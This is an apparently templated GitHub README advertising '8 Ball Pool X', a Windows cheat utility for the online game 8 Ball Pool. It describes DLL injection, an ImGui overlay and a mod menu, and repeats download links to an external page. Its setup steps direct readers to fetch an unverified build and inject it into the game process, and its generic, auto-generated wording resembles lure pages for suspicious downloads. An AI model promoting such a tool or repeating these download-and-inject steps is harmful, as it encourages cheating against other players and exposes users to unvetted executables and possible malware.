# 8 Ball Pool X v2026 - Game Script Utility 2026

> Windows utility for 8 Ball Pool focused on DLL injection, an ImGui overlay, and a mod menu for handling in-game settings.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Windows-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bengray50/8-ball-pool-x-executor-2026?style=flat-square)](https://github.com/bengray50/8-ball-pool-x-executor-2026)

---

<p align="center">
  <a href="https://bengray50.github.io/8-ball-pool-x-executor-2026/">
    <img src="https://img.shields.io/badge/Download-8%20Ball%20Pool%20X%20Script-brightgreen?style=for-the-badge" alt="Download 8 Ball Pool X Script">
  </a>
</p>

> **[Direct Download - 8 Ball Pool X](https://bengray50.github.io/8-ball-pool-x-executor-2026/)**

---

[Download Latest Build](https://bengray50.github.io/8-ball-pool-x-executor-2026/)

---

## What This Is

8 Ball Pool X is a Windows-based game utility built around a DLL injection entry point, an ImGui in-game overlay, and a mod menu interface. It is meant for 8 Ball Pool setups where you want a script-style helper that can be loaded through an injector or loader, then controlled from a menu while the match is running.

The emphasis is on direct in-game control instead of separate external tools. You get menu-based feature switches and a hotkey that brings up the interface during play. Like any injected game script, results depend on your own environment, the version of the game, and the loader path you use.

---

## Script Features

- DLL injection entry point for loading the utility into the game process
- ImGui overlay for on-screen controls and menu interaction
- Mod menu interface for switching options from inside the game
- Windows platform support
- Menu hotkey for opening and closing the overlay
- Feature toggles for enabling or disabling script functions
- Loader-friendly structure for injector-based use
- Built as a game script utility for 8 Ball Pool

---

## Setup

1. Download the latest build from the project download link above.
2. Extract the package to a folder on your Windows system.
3. Use your preferred injector or loader to attach the DLL to the target game process.
4. Launch 8 Ball Pool and open the ImGui menu with the assigned hotkey.
5. Adjust the available toggles from the overlay as needed.

Example flow:
- Start the game
- Load the DLL with the injector
- Open the overlay
- Enable or disable features from the mod menu

---

## Options

| Setting | Description |
| --- | --- |
| Menu Hotkey | Opens or closes the in-game overlay |
| Feature Toggles | Switch individual script functions on or off |
| Overlay Mode | Uses the ImGui interface for live control |
| Loader Method | Load through an injector or compatible loader |
| Target Platform | Windows |

Example configuration pattern:
- `menu_hotkey = Insert`
- `overlay_enabled = true`
- `feature_toggles = on`

---

## Compatibility

8 Ball Pool X is intended for Windows setups and a game runtime that supports DLL-based loading. Because it depends on injection and an overlay, behavior can differ based on the game build, loader, and local system setup.

Known considerations:
- Windows only
- Requires a working injector or loader
- Menu behavior depends on the hotkey configuration
- Some game updates may require a rebuild or updated loader path

---

## FAQ

### How do I use it?
Grab the build, move the files into a folder you can reach easily, and load the DLL with an injector or loader before using the in-game menu.

### How do I open the menu?
Press the assigned hotkey. The overlay uses ImGui, so the menu shows up in-game after the script has been loaded.

### Can I change the options?
Yes. The utility is built around feature toggles, which lets you turn the available functions on or off from the menu.

### Does it work on other platforms?
The extracted profile only identifies Windows support.

### What happens when the game updates?
Game updates can affect injected utilities. If compatibility changes, you may need a refreshed build or a revised loading method.

### Where are the files stored?
Keep the DLL, injector, and any related loader files in a folder you can access easily for future launches.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
